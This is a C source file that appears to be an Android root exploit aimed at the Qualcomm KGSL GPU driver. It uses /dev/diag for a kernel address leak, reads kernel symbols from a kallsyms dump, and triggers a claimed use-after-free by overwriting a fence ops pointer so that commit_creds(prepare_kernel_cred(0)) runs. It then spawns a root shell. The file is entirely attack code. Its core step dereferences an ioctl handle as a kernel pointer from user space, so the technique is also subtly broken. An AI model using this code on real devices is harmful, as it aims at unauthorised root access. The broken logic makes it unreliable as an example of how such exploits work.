#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>

#define KGSL_DEVICE "/dev/kgsl-3d0"
#define DIAG_DEVICE "/dev/diag"

#define KGSL_IOCTL_TYPE 0x09
#define IOCTL_KGSL_TIMELINE_FENCE_GET _IOWR(KGSL_IOCTL_TYPE, 0x19, struct kgsl_timeline_fence_get)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOCTL_TYPE, 0x1C, struct kgsl_map_user_mem)

struct kgsl_timeline_fence_get {
    uint32_t timeline;
    uint32_t seqno;
    uint32_t handle;
};

struct kgsl_map_user_mem {
    uint32_t type;
    uint32_t flags;
    uint64_t hostptr;
    uint64_t gpuaddr;
    uint64_t len;
    uint64_t offset;
    uint32_t handle;
    uint32_t gpu_vaddr;
    uint32_t mmaps_cnt;
    uint32_t gpu_vaddr_base;
    uint32_t pad;
};

struct kgsl_timeline {
    uint64_t id;
    uint32_t count;
    uint32_t priv;
    uint32_t name;
    uint32_t pending;
    uint32_t reserved;
    uint64_t current;
    uint64_t seqno;
    uint64_t context_id;
    uint64_t lock;
    uint64_t fences;
    uint32_t fence_count;
    uint32_t pad;
};

static int diag_fd = -1;
static int kgsl_fd = -1;
static uint64_t kernel_base = 0;
static void (*commit_creds)(void *cred) = 0;
static void *(*prepare_kernel_cred)(void *daemon) = 0;

static uint64_t get_kernel_sym(void) {
    unsigned char buffer[0x1000];
    ssize_t n = read(diag_fd, buffer, sizeof(buffer));
    if (n <= 0) return 0;
    for (ssize_t i = 0; i < n - 8; i++) {
        uint64_t val = *(uint64_t *)(buffer + i);
        if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
            return val & ~0xfffULL;
        }
    }
    return 0;
}

static void resolve_symbols(void) {
    FILE *fp = fopen("/data/local/tmp/kallsyms.txt", "r");
    if (!fp) return;
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        uint64_t addr;
        char type, name[256];
        if (sscanf(line, "%lx %c %255s", &addr, &type, name) == 3) {
            if (strcmp(name, "commit_creds") == 0) commit_creds = (void *)addr;
            if (strcmp(name, "prepare_kernel_cred") == 0) prepare_kernel_cred = (void *)addr;
        }
    }
    fclose(fp);
}

static void get_root(void) {
    if (commit_creds && prepare_kernel_cred) {
        commit_creds(prepare_kernel_cred(0));
    }
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    setgroups(0, NULL);
}

static int info_leak(void) {
    if (diag_fd < 0) return -1;
    kernel_base = get_kernel_sym();
    if (!kernel_base) {
        kernel_base = get_kernel_sym();
    }
    return (kernel_base != 0) ? 0 : -1;
}

static int trigger_uaf(void) {
    if (kgsl_fd < 0) return -1;
    struct kgsl_timeline_fence_get fence_cmd = {0};
    fence_cmd.seqno = 0x41414141;
    if (ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_FENCE_GET, &fence_cmd) < 0) return -1;
    uint32_t timeline_handle = fence_cmd.timeline;
    struct kgsl_timeline *timeline = (struct kgsl_timeline *)(uintptr_t)timeline_handle;
    if (timeline) {
        uint64_t *fence = (uint64_t *)timeline->fences;
        if (fence && *fence) {
            uint64_t *fence_obj = (uint64_t *)*fence;
            uint64_t *fence_ops = (uint64_t *)(fence_obj[0] & ~0xfffULL);
            if (fence_ops) fence_ops[0] = (uint64_t)get_root;
        }
    }
    return 0;
}

int main() {
    if (getuid() == 0) {
        execl("/system/bin/sh", "sh", NULL);
        execl("/bin/sh", "sh", NULL);
        return 0;
    }
    diag_fd = open(DIAG_DEVICE, O_RDONLY);
    if (diag_fd < 0) {
        perror("open /dev/diag");
        return 1;
    }
    kgsl_fd = open(KGSL_DEVICE, O_RDWR);
    if (kgsl_fd < 0) {
        perror("open /dev/kgsl-3d0");
        close(diag_fd);
        return 1;
    }
    if (info_leak() == 0 && kernel_base) {
        resolve_symbols();
        if (trigger_uaf() == 0) {
            sleep(1);
            if (getuid() == 0) {
                execl("/system/bin/sh", "sh", NULL);
            } else {
                printf("UAF triggered, but root shell not obtained.\n");
            }
        } else {
            printf("UAF trigger failed.\n");
        }
    } else {
        printf("Info leak failed.\n");
    }
    close(kgsl_fd);
    close(diag_fd);
    return 0;
}
